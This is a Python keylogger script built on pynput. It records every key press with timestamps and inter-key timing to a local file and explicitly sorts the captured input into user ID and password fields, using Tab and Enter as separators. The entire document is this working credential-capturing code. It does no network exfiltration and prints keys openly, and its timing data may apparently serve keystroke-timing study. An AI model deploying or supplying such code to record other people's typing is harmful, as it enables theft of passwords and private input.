import pynput
import time, datetime

from pynput.keyboard import Key, Listener
# from pynput.mouse import Listener

count = 0
keys = []
prev_time = 0
id = True
length = 0


# detect and write press to terminals
def on_press(key):
    global count, keys
    keys.append(key)
    count += 1

    print("{0}".format(key))

    # timer applicable if don't want to write every second
    if count >= 1:
        count = 0
        write_file(keys)
        keys = []


# write officially to logging.txt
def write_file(keys):
    global prev_time, id, length

    with open("logging.txt", "a") as f: # append mode (f)
        for key in keys:
            k = str(key).replace("'", "")
            # options for removal/re-writing of specific key presses
            if id:
                id = False
                length += 1
                f.write('\nID\n')
                write_letter(k, f)
            elif k.find("enter") > 0:
                f.write("PW length: " + str(length))
                length = 0
                f.write('\nID')
            elif k.find("tab") > 0:
                f.write("ID length: " + str(length))
                length = 0
                f.write("\nPW")
            # elif k.find("key") == -1:     # key doesn't exist
            #     f.write(k)
            else:
                length += 1
                write_letter(k, f)

            # if first word then type ID
            # after tab, store password data
            # after enter, return to ID

            f.write(str("\n"))


# writes a single letter
def write_letter(k, f):
    global prev_time
    
    f.write(str(k) + " - ")
    # write time and milliseconds between times
    curr_time = int(round(time.time() * 1000))
    difference = curr_time - prev_time
    prev_time = curr_time
    f.write(str(difference) + " - ")

    f.write(str(datetime.datetime.now()))


# when esc is pressed, cancel the program
def on_release(key):
    if key == Key.esc:
        return False


# start listening
with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()


'''
get difference in milliseconds
https://stackoverflow.com/questions/5998245/get-current-time-in-milliseconds-in-python

show current time
https://stackoverflow.com/questions/415511/how-to-get-the-current-time-in-python

mouse listener
https://www.youtube.com/watch?v=kJshtCfqCsY&list=PLMjIyH4vq-JcQf6CkwPLEx2pZNX5RPd6E&index=19&t=0s
'''